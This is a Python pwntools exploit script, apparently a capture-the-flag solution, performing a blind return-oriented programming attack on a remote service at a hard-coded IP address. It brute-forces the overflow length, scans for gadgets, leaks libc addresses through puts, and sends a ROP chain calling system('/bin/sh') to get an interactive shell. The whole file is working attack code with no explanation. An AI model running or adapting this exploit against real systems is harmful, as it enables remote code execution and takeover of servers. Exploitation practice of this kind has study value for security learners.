#coding=utf8
from pwn import *
from LibcSearcher import *

#sh = remote('34.92.37.22', 10000)

#sh = process('./brop')

#context.log_level = 'debug'
libc = ELF('./libc-2.23.so')
def getbuflength():
    i = 0
    while 1:
        try:
            #sh = remote('127.0.0.1', 9999)
            sh = remote('34.92.37.22', 10000)
            sh.recvuntil('Welcome to this blind pwn!\n')
            sh.send(i * 'a')
            rev = sh.recv()
            sh.close()
            if not rev.startswith('Goodbye!'):
                return i - 1
            else:
                i += 1
        except EOFError:
            sh.close()
            return i - 1


def get_main_addr(length):
    addr = 0x400000
    while 1:
        if addr %0x80==0:
            print hex(addr)
        try:
            sh = remote('34.92.37.22', 10000)
            sh.recvuntil('pwn!\n')
            payload = 'a' * length + p64(addr)
            sh.sendline(payload)
            content = sh.recv()
            print content
            sh.close()
            return addr
        except Exception:
            addr += 1
            sh.close()

def get_brop_gadget(length, main_addr, addr):
    try:
        sh = remote('34.92.37.22', 10000)
        sh.recvuntil('pwn!\n')
        payload = 'a' * length + p64(addr) + p64(0) * 6 + p64(
            main_addr) + p64(0) * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        print content
        # stop gadget returns memory
        if not content.startswith('Welcome'):
            return False
        return True
    except Exception:
        sh.close()
        return False
        
def check_brop_gadget(length, addr):
    try:
        sh = remote('34.92.37.22', 10000)
        sh.recvuntil('pwn!\n')
        payload = 'a' * length + p64(addr) + 'a' * 8 * 10
        sh.sendline(payload)
        content = sh.recv()
        sh.close()
        return False
    except Exception:
        sh.close()
        return True


def find_brop_gadget(length, main_addr):
    addr = 0x400000
    while 1:
        if addr%0x80==1:
            print hex(addr)
        if get_brop_gadget(length, main_addr, addr):
            if check_brop_gadget(length, addr):
                return addr
        addr += 1

def leak(length, rsi_rdi_ret, puts_plt, leak_addr, mainaddr):
    sh = remote('34.92.37.22', 10000)
    payload = 'a' * length + p64(rsi_rdi_ret) + p64(leak_addr) + p64(leak_addr)+ p64(
        puts_plt) + p64(mainaddr)
    sh.recvuntil('pwn!\n')
    sh.sendline(payload)
    try:
        data = sh.recv()
        sh.close()
        try:
            data = data[:data.index("\nWelcome")]
        except Exception:
            data = data
        if data == "":
            data = '\x00'
        return data
    except Exception:
        sh.close()
        return None


def leakfunction(length, rdi_ret, puts_plt, mainaddr):
    addr = 0x400000
    result = ""
    while addr < 0x401000:
        print hex(addr)
        data = leak(length, rdi_ret, puts_plt, addr, mainaddr)
        if data is None:
            continue
        else:
            result += data
            addr += len(data)
    with open('code', 'wb') as f:
        f.write(result)

#length = getbufferflow_length()
length = 40
print "buf_len"+str(length)
#mainaddr = get_stop_addr(length)
mainaddr = 0x400570
print "stop"+hex(mainaddr)

#brop_gadget = find_brop_gadget(length,mainaddr)
brop_gadget = 0x40077a
print "brop_ggt"+hex(brop_gadget)

rdi_ret = brop_gadget + 9
rsi_rdi_ret = brop_gadget + 7
#puts_plt = get_puts_addr(length, rsi_rdi_ret, mainaddr)
#print "puts_plt"+hex(puts_plt)
puts_plt = 0x400520
#leakfunction(length, rsi_rdi_ret, puts_plt, mainaddr)
puts_got = 0x601018
read_got = 0x601028
sh = remote('34.92.37.22', 10000)
sh.recvuntil('pwn!\n')
payload = 'a' * length + p64(rsi_rdi_ret) + p64(read_got) + p64(read_got)+ p64(puts_plt) + p64(
    mainaddr)
sh.sendline(payload)
data = sh.recvuntil('Welcome', drop=True)
print data
puts_addr = u64(data[:8].ljust(8, '\x00'))
print hex(puts_addr)
#libc = LibcSearcher('read', puts_addr)
libc_base = puts_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
print system_addr
binsh_addr =libc_base +libc.search('/bin/sh').next()
#binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(
    system_addr) + p64(mainaddr)
sh.sendline(payload)
sh.interactive()